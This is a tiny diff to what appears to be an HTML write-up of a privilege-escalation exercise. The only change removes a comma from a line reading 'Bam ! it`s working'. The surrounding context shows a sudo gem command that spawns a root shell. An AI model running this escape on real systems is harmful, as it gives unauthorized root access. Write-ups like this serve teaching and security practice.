@@ -68,7 +68,7 @@ published: true
 <img src="https://i.ibb.co/Mn5tVyQ/cmd1645.jpg" alt="cmd1645" border="0">
 <p>Let`s try to escalate privilege again</p>
 <img src="https://i.ibb.co/1M7W8dv/priv.jpg" alt="priv" border="0">
-<p>Bam ! , it`s working</p>
+<p>Bam ! it`s working</p>
 <pre>
 <span class="k">sudo gem open -e "/bin/sh -c /bin/sh" rdoc</span>
                                                                 </pre>
